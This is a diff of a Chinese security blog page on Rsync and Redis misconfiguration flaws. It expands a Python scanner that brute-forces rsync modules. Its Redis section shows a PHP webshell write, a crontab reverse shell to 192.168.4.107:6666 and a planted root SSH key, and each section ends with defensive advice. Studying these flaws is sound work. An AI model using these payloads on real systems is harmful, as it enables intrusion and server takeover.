@@ -18,7 +18,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://kun0769-1258107287.cos.ap-guangzhou.myqcloud.com/rsync1.png">
 <meta property="og:image" content="https://kun0769-1258107287.cos.ap-guangzhou.myqcloud.com/redis1.png">
-<meta property="og:updated_time" content="2019-05-14T09:46:12.505Z">
+<meta property="og:updated_time" content="2019-05-15T14:00:51.006Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Rsync漏洞 &amp;&amp; Redis漏洞">
 <meta name="twitter:description" content="Rsync漏洞 &amp;amp;&amp;amp; Redis漏洞">
@@ -174,7 +174,7 @@
 <p>错误的配置<br>1）使用root用户权限运行<br>2）没开启只读模式<br>3）没有配置访问权限设置，用户可以进行未授权访问<br><img src="https://kun0769-1258107287.cos.ap-guangzhou.myqcloud.com/rsync1.png" alt=""></p>
 <p>我是如何沦陷ChinaZ下载站服务器的<br><img src="" alt=""><a href="http://www.anquan.us/static/bugs/wooyun-2013-026232.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2013-026232.html</a></p>
 <h3 id="漏洞扫描与发现"><a href="#漏洞扫描与发现" class="headerlink" title="漏洞扫描与发现"></a>漏洞扫描与发现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n --open -p 873 X.X.X.X/24</span><br></pre></td></tr></table></figure>
-<h3 id="Python编写批量扫描"><a href="#Python编写批量扫描" class="headerlink" title="Python编写批量扫描"></a>Python编写批量扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">def rsync_Vuln_Check(ip):</span><br><span class="line">	ip = ip.strip()</span><br><span class="line">	command = &quot;rsync &quot; + ip+&quot;::&quot;</span><br><span class="line">	print(&quot;Checking &#123;&#125;&quot;.format(ip))</span><br><span class="line">	dirlist = []</span><br><span class="line">	for line in os.popen(command):</span><br><span class="line">		x = line.find(&quot;\t&quot;)</span><br><span class="line">		y = line[0:x - 6]</span><br><span class="line">		dirlist.append(y)</span><br><span class="line"></span><br><span class="line">	for dir in dirlist:</span><br><span class="line">		userlist = [&quot;test&quot;, &quot;root&quot;, &quot;www&quot;]</span><br><span class="line">		for user in userlist:</span><br><span class="line">			command = &quot;rsync &quot; + user + &quot;@&quot; + ip + &quot;::&quot; + dir + &quot; --password-file=pass.txt&quot;</span><br><span class="line">			try:</span><br><span class="line">				#print(command)</span><br><span class="line">				output = os.system(command)</span><br><span class="line">				if os.popen(command).read():</span><br><span class="line">					res_str = &quot;[+]Vul Found： &quot; + command</span><br><span class="line">					with open(&quot;Vuln_IP.txt&quot;,&quot;a+&quot;) as f:</span><br><span class="line">						f.write(res_str+&quot;\n&quot;)</span><br><span class="line">				else:</span><br><span class="line">					pass</span><br><span class="line">			except Exception as e:</span><br><span class="line">				print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">with open(&apos;ip.txt&apos;) as f:</span><br><span class="line">	iplist = f.readlines()</span><br><span class="line">	for x in iplist:</span><br><span class="line">		rsync_Vuln_Check(x)</span><br></pre></td></tr></table></figure>
+<h3 id="Python编写批量扫描"><a href="#Python编写批量扫描" class="headerlink" title="Python编写批量扫描"></a>Python编写批量扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import datetime</span><br><span class="line">import threading</span><br><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">def save_file(result):</span><br><span class="line">	create_file_name = datetime.datetime.now().strftime(&apos;%Y-%m-%d&apos;)</span><br><span class="line">	new_file = &apos;&#123;&#125;_open.txt&apos;.format(create_file_name)</span><br><span class="line">	with open(new_file,&apos;a+&apos;) as fd:</span><br><span class="line">		fd.writelines(result + &apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">def socket_request(tarip,tarport):</span><br><span class="line">	try:</span><br><span class="line">		timeout = 2</span><br><span class="line">		setdefaulttimeout(timeout)</span><br><span class="line">		s = socket(AF_INET,SOCK_STREAM)</span><br><span class="line">		address = (str(tarip),int(tarport))</span><br><span class="line">		s.connect(address)</span><br><span class="line">		s.close()</span><br><span class="line">		info = &apos;&#123;&#125;:&#123;&#125; Open&apos;.format(tarip,tarport)</span><br><span class="line">		print(&apos;\033[6;30;42m&apos; + info + &apos;\033[0m&apos;)</span><br><span class="line">		save_file(tarip)</span><br><span class="line">		yield info</span><br><span class="line">	except:</span><br><span class="line">		print(&apos;\033[0;31m&apos; + &apos;&#123;&#125;:&#123;&#125; &#123;&#125;&apos;.format(tarip,tarport,&apos;Close&apos;) + &apos;\033[0m&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def port_open_scan():</span><br><span class="line">	with open(&apos;ip.txt&apos;,&apos;r&apos;) as read_ip:</span><br><span class="line">		tarport = 873</span><br><span class="line">		for ip in read_ip:</span><br><span class="line">			target_ip = ip.strip()</span><br><span class="line">			for x in socket_request(target_ip,tarport):</span><br><span class="line">				pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rsync_pass_check(ip):</span><br><span class="line">	ip = ip.strip()</span><br><span class="line">	command = &quot;rsync &quot; + ip +&quot;::&quot;</span><br><span class="line">	print(&quot;Checking &#123;&#125;&quot;.format(ip))</span><br><span class="line">	dirlist = []</span><br><span class="line">	for line in os.popen(command):</span><br><span class="line">		x = line.find(&quot;\t&quot;)</span><br><span class="line">		y = line[0:x]</span><br><span class="line">		dirlist.append(y)</span><br><span class="line"></span><br><span class="line">	for dir in dirlist:</span><br><span class="line">		userlist = [&quot;www&quot;,&quot;root&quot;,&quot;test&quot;]</span><br><span class="line">		for user in userlist:</span><br><span class="line">			crack_command = &quot;rsync &quot; + user + &quot;@&quot; + ip + &quot;::&quot; + dir + &quot;--password-file=pass.txt&quot;</span><br><span class="line">			try:</span><br><span class="line">				output = os.system(crack_command)</span><br><span class="line">				if os.popen(crack_command).read():</span><br><span class="line">					res_str = &quot;[+] Vul Found: &quot; + crack_command</span><br><span class="line">					with open(&quot;Vuln_IP.txt&quot;,&quot;a+&quot;) as f:</span><br><span class="line">						f.write(res_str+&quot;\n&quot;)</span><br><span class="line">				else:</span><br><span class="line">					pass</span><br><span class="line">			except Exception as e:</span><br><span class="line">				print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">	port_open_scan()</span><br><span class="line">	open_port = &apos;&#123;&#125;_open.txt&apos;.format(datetime.datetime.now().strftime(&apos;%Y-%m-%d&apos;))</span><br><span class="line"></span><br><span class="line">	with open(open_port,&apos;r&apos;) as f:</span><br><span class="line">		iplist = f.readlines()</span><br><span class="line">		for ip in iplist:</span><br><span class="line">			rsync_pass_check(ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	t = threading.Thread(target=main)</span><br><span class="line">	t.start()</span><br></pre></td></tr></table></figure>
 <h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><p>1）限定访问的IP<br>2）不允许匿名访问<br>3）防止弱口令<br>4）禁用root权限</p>
 <h2 id="Redis配置不当"><a href="#Redis配置不当" class="headerlink" title="Redis配置不当"></a>Redis配置不当</h2><p>Redis是一个开源、支持网络、基于内存、键值对存储数据库，使用ANSI C编写。<br>自从Redis未授权（未设置用户名和密码）问题获取Linux系统root权限的攻击方法的披露后，由于其易用性，利用该问题入侵Linux服务进行挖矿。</p>
 <p>凤凰网某站点redis未授权访问导致Getshell<br><img src="" alt=""><a href="http://www.anquan.us/static/bugs/wooyun-2015-0161323.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2015-0161323.html</a></p>
@@ -183,7 +183,7 @@
 <p>有三种攻击方式<br>1）获取WebShell<br>这种方式前提是要知道网站的目录路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/www/html/  #指定一句话木马文件存放地址</span><br><span class="line"></span><br><span class="line">config set dbfilebame shell.php #指定一句话木马文件名字</span><br><span class="line"></span><br><span class="line">set x &quot;&lt;?php @eval($_POST[a]);?&gt;&quot; #写入一句话木马</span><br><span class="line"></span><br><span class="line">save #保存</span><br></pre></td></tr></table></figure></p>
 <p>2）写入crontab任务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.4.107/6666 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">Save</span><br></pre></td></tr></table></figure></p>
 <p>攻击方再使用nc来监听端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc –lvnp 6666</span><br></pre></td></tr></table></figure></p>
-<p>3）写入ssh公钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h 192.168.4.1 -x set crack</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config get dir </span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">Save</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@192.168.4.1</span><br></pre></td></tr></table></figure></p>
+<p>3）写入ssh公钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h 192.168.4.1 -x set crack</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config get dir</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">Save</span><br><span class="line"></span><br><span class="line">ssh -i id_rsa root@192.168.4.1</span><br></pre></td></tr></table></figure></p>
 <h3 id="Python爆破redis弱口令"><a href="#Python爆破redis弱口令" class="headerlink" title="Python爆破redis弱口令"></a>Python爆破redis弱口令</h3><p><img src="https://kun0769-1258107287.cos.ap-guangzhou.myqcloud.com/redis1.png" alt=""></p>
 <h3 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h3><p>1）设置密码<br>2）不要把redis暴露在公网<br>3）使用普通用户权限来启动redis<br>4）对.ssh降权（chmod 400）和锁定（chattar +i）</p>
 
@@ -268,6 +268,15 @@
 
   
 <nav id="article-nav">
+  
+    <a href="/2019/05/15/ElasticSearch漏洞-Mongodb漏洞-Mongodb漏洞/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          ElasticSearch漏洞 &amp;&amp; Mongodb漏洞 &amp;&amp; Mongodb漏洞
+        
+      </div>
+    </a>
   
   
     <a href="/2019/05/13/Zabbix漏洞/" id="article-nav-older" class="article-nav-link-wrap">
@@ -435,15 +444,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">KVM</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Linux</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">LAMP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">KVM</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -463,11 +472,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">NFS</a>
+                <a href="javascript:void(0)" class="js-tag color3">PyCharm</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">PyCharm</a>
+                <a href="javascript:void(0)" class="js-tag color4">NFS</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -503,7 +512,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">gitlab</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">git</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">jenkins</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">简介</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -515,23 +536,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">简介</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">gitlab</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">jenkins</a>
+                <a href="javascript:void(0)" class="js-tag color4">k8s</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">jumpserver</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">k8s</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -555,15 +564,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">shell</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">sql</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">svn</a>
+                <a href="javascript:void(0)" class="js-tag color1">shell</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -579,11 +584,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">日常运维</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">文件与目录</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">日常运维</a>
+                <a href="javascript:void(0)" class="js-tag color4">svn</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -611,10 +620,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">压缩和打包</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">keepalived</a>
               </li>
              
@@ -624,6 +629,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">负载均衡</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">压缩和打包</a>
               </li>
              
               <li class="article-tag-list-item">
